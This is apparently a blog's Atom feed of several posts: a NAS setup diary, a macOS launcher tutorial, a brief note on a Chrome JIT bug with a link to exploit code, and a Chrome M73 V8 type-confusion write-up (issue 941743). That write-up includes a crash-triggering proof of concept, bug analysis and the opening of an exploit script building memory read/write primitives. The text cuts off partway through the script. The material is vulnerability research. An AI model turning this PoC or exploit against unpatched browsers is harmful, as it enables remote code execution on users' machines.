    <content type="html"><![CDATA[<h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p>  大概五月的时候丢失了一波数据，大概不到2TB，虽然最后救回来了一部分，但是仍然让我心有余悸，生怕这样的情况再次发生，索性申请资金买NAS，由于本身又不折腾硬件什么的，就直接一步到位选择了群晖DS218+，双盘位，x86，够折腾了。</p><a id="more"></a><p>因为是两盘位，所以尽量硬盘选择的大一点，不然后续置换很麻烦，而且为了保证数据安全肯定是要做raid的，我这里直接买了两块希捷的8T企业盘，肉疼是肯定的，但是换来的是大容量+安全性，所以还是物有所值；最后还给NAS加了一条内存，方便后面折腾docker。</p><h2 id="套件-amp-amp-Docker"><a href="#套件-amp-amp-Docker" class="headerlink" title="套件&amp;&amp;Docker"></a>套件&amp;&amp;Docker</h2><p>  我本身使用NAS就是为了数据备份，所以群晖提供的套件还是十分实用，有种买软件送NAS的感觉，手机相册直接使用<code>Monments</code>备份了，mac可以tm备份上去，不过我还是专门准备了一块2t的移动硬盘给mac做tm备份，重要的文件会选择多处备份，直接用了群晖的<code>Synology Drive</code>给同步到了NAS上，当然这些都比较简单基础。</p><p>  为了随时能连上nas使用，群晖虽然提供了quick connect，但是涉及到NAS上跑着的一些docker的时候，这样就很不方便了；所以我找联通开了公网ip，然后NAS设置里开了DDNS，然后可以用群晖提供的域名直接来访问自己的NAS了，不过为了安全起见，我开了一些安全策略以及ban掉了非必须端口，并且开了SSL。</p><p>在有公网ip的情况下，就可以开始造作了，我折腾的比较多的是docker：</p><ol><li>gitea</li><li>snell docker(for proxy)</li><li>Aria2 </li><li>Ubuntu &amp;&amp; mongodb</li></ol><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.27.57%402x.png"></p><p>为了不暴露太多端口出来（gitea的，ubuntu的啥的），我的设想是只暴露一个代理的端口，然后我连上代理，其他的容器通过代理本地访问，这样能最大限度减少风险，代理的话也不选用常用的，或者说自己做一些修改。</p><p>自己搞个git用真舒服啊，gitlab太重了，个人使用的话没必要，gitea比较轻量级，真香。</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.35.05%402x.png"></p><p>总之这还是蛮香的，配置好aria2后，下电影再结合群晖的<code>Video Station</code> 家庭影院分分钟搞起，还能随时随地学习，真香 😄</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.37.06%402x.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;关于&quot;&gt;&lt;a href=&quot;#关于&quot; class=&quot;headerlink&quot; title=&quot;关于&quot;&gt;&lt;/a&gt;关于&lt;/h2&gt;&lt;p&gt;  大概五月的时候丢失了一波数据，大概不到2TB，虽然最后救回来了一部分，但是仍然让我心有余悸，生怕这样的情况再次发生，索性申请资金买NAS，由于本身又不折腾硬件什么的，就直接一步到位选择了群晖DS218+，双盘位，x86，够折腾了。&lt;/p&gt;</summary>
    
    
    
    <category term="其他" scheme="http://o0xmuhe.me/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="其他" scheme="http://o0xmuhe.me/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>exploit for crbug1086890</title>
    <link href="http://o0xmuhe.me/2020/08/27/exploit-for-crbug1086890/"/>
    <id>http://o0xmuhe.me/2020/08/27/exploit-for-crbug1086890/</id>
    <published>2020-08-27T07:07:08.000Z</published>
    <updated>2020-08-27T07:25:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bug-info"><a href="#bug-info" class="headerlink" title="bug info"></a>bug info</h2><p>来自pj0的<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2046">glazunov</a>的洞，一个JIT优化中的洞，缺少边界检查最终导致oob r/w。</p><a id="more"></a><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>比较不好的地方就是需要大概猜一下那个oobarray的elements的地址，使得我们想用来aar/w的array或者arraybuffer落在这后面，大概调整个偏移使得能够正常读写到就行。</p><p>测试版本:83.0.4103.61 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Commit: 88bff78e26dbd25dcbb342d4b07c7e66c0f048be</span><br><span class="line">Branch Base Commit: 8ad47e8d21f6866e4a37f47d83a860d41debf514</span><br><span class="line">Branch Base Position: 756066</span><br><span class="line">V8 Commit: 3b627511511f00c552ced504c1f182bdcc3480af</span><br><span class="line">V8 Version: 8.3.110.9</span><br><span class="line">V8 Position: 19</span><br><span class="line">Skia Commit: c3d05a789930913af94174961bc6f90894196f62</span><br></pre></td></tr></table></figure><ul><li>调试会比较麻烦点，gdb 直接起触发有问题（我这里是），我是开了coredump，然后触发crash看看内存啥的调的。</li><li>biguint64 还是 arraybuffer都行，喜欢啥用啥。</li><li>想成功率高，要用web worker（我觉得），要么死猜几个地址，要么随机撞大运。</li></ul><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/crbug1086890/CleanShot%202020-08-27%20at%2011.26.03.png" alt="exploit linux d8"></p><p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/chrome_M83_crbug1086890_RCE">完整利用代码</a></p><hr><p>觉得有用的朋友可以打赏一杯☕️ :)</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;bug-info&quot;&gt;&lt;a href=&quot;#bug-info&quot; class=&quot;headerlink&quot; title=&quot;bug info&quot;&gt;&lt;/a&gt;bug info&lt;/h2&gt;&lt;p&gt;来自pj0的&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&quot;&gt;glazunov&lt;/a&gt;的洞，一个JIT优化中的洞，缺少边界检查最终导致oob r/w。&lt;/p&gt;</summary>
    
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/categories/exploit/"/>
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
    <category term="chrome" scheme="http://o0xmuhe.me/tags/chrome/"/>
    
  </entry>
  
  <entry>
    <title>make-script-to-macOS App</title>
    <link href="http://o0xmuhe.me/2020/08/07/make-script-to-macOS-App/"/>
    <id>http://o0xmuhe.me/2020/08/07/make-script-to-macOS-App/</id>
    <published>2020-08-07T04:46:24.000Z</published>
    <updated>2020-08-07T04:56:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-需求"><a href="#0x00-需求" class="headerlink" title="0x00 : 需求"></a>0x00 : 需求</h2><p>主要是Ghidra这个东西，每次启动都要命令行 <code>GhidraRun</code>，太麻烦了，所以就想把这个启动脚本封装成一个macOS的APP，方便使用。</p><a id="more"></a><h2 id="0x01-过程"><a href="#0x01-过程" class="headerlink" title="0x01 : 过程"></a>0x01 : 过程</h2><p>直接使用了 <a href="https://gist.github.com/mathiasbynens/674099">别人写好的appfiy.sh</a> ，我用的是原作者的，链接里的是二次开发的，其实本质是一样的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">APPNAME=<span class="variable">$&#123;2:-$(basename &quot;<span class="variable">$&#123;1&#125;</span>&quot; &#x27;.sh&#x27;)&#125;</span>;</span><br><span class="line">DIR=<span class="string">&quot;<span class="variable">$&#123;APPNAME&#125;</span>.app/Contents/MacOS&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -a <span class="string">&quot;<span class="variable">$&#123;APPNAME&#125;</span>.app&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;PWD&#125;</span>/<span class="variable">$&#123;APPNAME&#125;</span>.app already exists :(&quot;</span>;</span><br><span class="line"><span class="built_in">exit</span> 1;</span><br><span class="line"><span class="keyword">fi</span>;</span><br><span class="line"></span><br><span class="line">mkdir -p <span class="string">&quot;<span class="variable">$&#123;DIR&#125;</span>&quot;</span>;</span><br><span class="line">cp <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;DIR&#125;</span>/<span class="variable">$&#123;APPNAME&#125;</span>&quot;</span>;</span><br><span class="line">chmod +x <span class="string">&quot;<span class="variable">$&#123;DIR&#125;</span>/<span class="variable">$&#123;APPNAME&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;PWD&#125;</span>/<span class="variable">$APPNAME</span>.app&quot;</span>;</span><br></pre></td></tr></table></figure><p>因为macOS下app本质是一个目录，所以只需要按照特定的格式构建这个目录即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ <span class="built_in">cd</span> /Applications/Ghidra.app</span><br><span class="line">╭─    /Applications/Ghidra.app ·· ✔  at 12:51:35 </span><br><span class="line">╰─</span><br><span class="line">❯ ls</span><br><span class="line">Contents Icon?</span><br><span class="line">❯ tree .</span><br><span class="line">.</span><br><span class="line">├── Contents</span><br><span class="line">│   └── MacOS</span><br><span class="line">│       └── Ghidra</span><br><span class="line">└── Icon\r</span><br></pre></td></tr></table></figure><p>本来我是把ghrida的启动脚本直接放进来的，但是发现有一些目录的问题，索性直接绝对路径启动这个脚本好了(懒省事儿啊 hhh)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------</span></span><br><span class="line"><span class="comment"># Ghidra launch</span></span><br><span class="line"><span class="comment">#----------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/Users/muhe/Tools/ghidra/ghidraRun</span><br></pre></td></tr></table></figure><p>最后，图标可以先复制你想用的图片，然后对app右键，get info，点击信息栏上面的小图标，之后cmd+v就行了，也挺方便。</p><p>最后，就可以很舒服的启动了。</p><h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 : 参考"></a>0x02 : 参考</h2><p><a href="https://mathiasbynens.be/notes/shell-script-mac-apps">shell-script-mac-apps</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-需求&quot;&gt;&lt;a href=&quot;#0x00-需求&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 需求&quot;&gt;&lt;/a&gt;0x00 : 需求&lt;/h2&gt;&lt;p&gt;主要是Ghidra这个东西，每次启动都要命令行 &lt;code&gt;GhidraRun&lt;/code&gt;，太麻烦了，所以就想把这个启动脚本封装成一个macOS的APP，方便使用。&lt;/p&gt;</summary>
    
    
    
    <category term="环境配置" scheme="http://o0xmuhe.me/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="tools" scheme="http://o0xmuhe.me/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>Chrome M73 issue 941743</title>
    <link href="http://o0xmuhe.me/2020/06/20/Chrome-M73-issue-941743/"/>
    <id>http://o0xmuhe.me/2020/06/20/Chrome-M73-issue-941743/</id>
    <published>2020-06-19T16:41:53.000Z</published>
    <updated>2020-06-20T11:07:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-bug-info"><a href="#1-bug-info" class="headerlink" title="1. bug info"></a>1. bug info</h2><p>这是科恩实验室19年 blackhat USA议题中那套利用的rce部分，v8 JIT优化的漏洞。</p><p>类型混淆漏洞。</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ~/v8/v8/out/x64.debug/d8    ~/chrome_M73_crbug941743_RCE/raw_poc.js </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Fatal error in ../../src/elements.cc, line 881</span></span><br><span class="line"><span class="comment"># Debug check failed: IsFastElementsKind(from_kind).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#FailureMessage Object: 0x7fff3b6caa70</span></span><br><span class="line">==== C stack trace ===============================</span><br><span class="line"></span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f95be106e1e]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libplatform.so(+0x2d527) [0x7f95be0ac527]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x218) [0x7f95be0f4fb8]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(+0x349fc) [0x7f95be0f49fc]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x32) [0x7f95be0f5092]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1585f80) [0x7f95bcf27f80]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1582a31) [0x7f95bcf24a31]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1a8b5b8) [0x7f95bd42d5b8]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(v8::internal::Runtime_TransitionElementsKind(int, unsigned long*, v8::internal::Isolate*)+0x117) [0x7f95bd42d247]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x212bd00) [0x7f95bdacdd00]</span><br><span class="line">Received signal 4 ILL_ILLOPN 7f95be104581</span><br><span class="line">[1]    8542 illegal hardware instruction (core dumped)  ~/v8/v8/out/x64.debug/d8 ~/chrome_M73_crbug941743_RCE/raw_poc.js</span><br></pre></td></tr></table></figure><h2 id="2-poc"><a href="#2-poc" class="headerlink" title="2. poc"></a>2. poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Impact version: 6.1.462+ </span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="number">300</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">var</span> a2 = arr.map(<span class="function"><span class="keyword">function</span> (<span class="params">v, i</span>) </span>&#123;</span><br><span class="line">        arr.push(<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    arr.some(arr.constructor);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">1000000</span>; ++j) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. array.map 方法，对array中每个元素执行参数指定的操作，然后返回一个新的数据</span></span><br><span class="line"><span class="string">2. array.some 方法，是一个检测</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15904645923418.jpg)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这个patch在这个漏洞修补的commit里是有的，就这个poc：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line"><span class="comment">// Copyright 2019 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Flags: --allow-natives-syntax --noenable-slow-asserts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This call ensures that TurboFan won&#x27;t inline array constructors.</span></span><br><span class="line"><span class="built_in">Array</span>(<span class="number">2</span>**<span class="number">30</span>);</span><br><span class="line"><span class="comment">// Set up a fast holey smi array, and generate optimized code.</span></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>, <span class="number">2</span>, ,,, <span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapping</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a.map(<span class="function"><span class="params">v</span> =&gt;</span> v);</span><br><span class="line">&#125;</span><br><span class="line">mapping(a);</span><br><span class="line">mapping(a);</span><br><span class="line">%OptimizeFunctionOnNextCall(mapping);</span><br><span class="line">mapping(a);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now lengthen the array, but ensure that it points to a non-dictionary</span></span><br><span class="line"><span class="comment">// backing store.</span></span><br><span class="line">a.length = (<span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>)-<span class="number">1</span>;</span><br><span class="line">a.fill(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">a.push(<span class="number">2</span>);</span><br><span class="line">a.length += <span class="number">500</span>;</span><br><span class="line"><span class="comment">// Now, the non-inlined array constructor should produce an array with</span></span><br><span class="line"><span class="comment">// dictionary elements: causing a crash.</span></span><br><span class="line">mapping(a);</span><br></pre></td></tr></table></figure><h2 id="3-bug-analysis"><a href="#3-bug-analysis" class="headerlink" title="3. bug analysis"></a>3. bug analysis</h2><p>作者的分析:</p><ol><li>The optimization of JSCreateArray (for |a2|) bailout at typed lowering phase. When executing JITed code, it calls to |Runtime_NewArray|. </li><li>There’s a CheckMaps for |arr|, but it can’t ensure an array that produced by |arr| is the same type. For example, |arr| is extended by |push| and it has PACKED_SMI_ELEMENTS, but |a2| could be constructed by |Runtime_NewArray| and it could have DICTIONARY_ELEMENTS. </li><li>TransitionAndStoreElement assumes the source array should be HOLEY_SMI_ELEMENTS, this can’t ensure either. Because when calling to |Runtime_NewArray| and array’s actual length &gt;= 0x4000000, there’ll be a dictionary elements array. So our bug occurs.</li></ol><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15910826407633.jpg"></p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15904673688147.jpg"></p><p><a href="https://cy2cs.top/2020/04/20/issue-941743-cve-2019-5825/">issue-941743-cve-2019-5825</a></p><p>为什么开始需要一个<code> Array(2 ** 30)</code></p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15910830837266.jpg"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argv.length() == <span class="number">1</span>) &#123;</span><br><span class="line">  Handle&lt;Object&gt; argument_one = argv.at&lt;Object&gt;(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (argument_one-&gt;IsSmi()) &#123;</span><br><span class="line">    <span class="keyword">int</span> value = Handle&lt;Smi&gt;::cast(argument_one)-&gt;value();</span><br><span class="line">    <span class="keyword">if</span> (value &lt; <span class="number">0</span> ||</span><br><span class="line">        JSArray::SetLengthWouldNormalize(isolate-&gt;heap(), value)) &#123;</span><br><span class="line">      <span class="comment">// the array is a dictionary in this case.</span></span><br><span class="line">      can_use_type_feedback = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value != <span class="number">0</span>) &#123;</span><br><span class="line">      holey = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (value &gt;= JSArray::kInitialMaxFastElementArray) &#123;</span><br><span class="line">        can_inline_array_constructor = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Non-smi length argument produces a dictionary</span></span><br><span class="line">    can_use_type_feedback = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以只要<code>can_use_type_feedback = false; </code>即可。</p><h2 id="4-how-to-exploit"><a href="#4-how-to-exploit" class="headerlink" title="4. how to exploit?"></a>4. how to exploit?</h2><p>构造<code>oobarray</code>，利用<code>oobarray</code>去修改后面<code>arraybuffer</code>长度用来任意地址读写，利用<code>oobarray</code>读写<code>leak_obj</code>实现<code>addrof</code>和<code>fakeobj</code>原语。s</p><h2 id="5-exploit"><a href="#5-exploit" class="headerlink" title="5. exploit"></a>5. exploit</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    exploit for crbug-941743</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">is_in_v8_flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"><span class="comment">// tookit</span></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"><span class="keyword">var</span> g_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> g_float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(g_buffer);</span><br><span class="line"><span class="keyword">var</span> g_uint64 = <span class="keyword">new</span> BigUint64Array(g_buffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">float2address</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  g_float64[<span class="number">0</span>] = f;</span><br><span class="line">  <span class="keyword">return</span> g_uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address2float</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> i = BigInt(addr);</span><br><span class="line">  g_uint64[<span class="number">0</span>] = i;</span><br><span class="line">  <span class="keyword">return</span> g_float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span 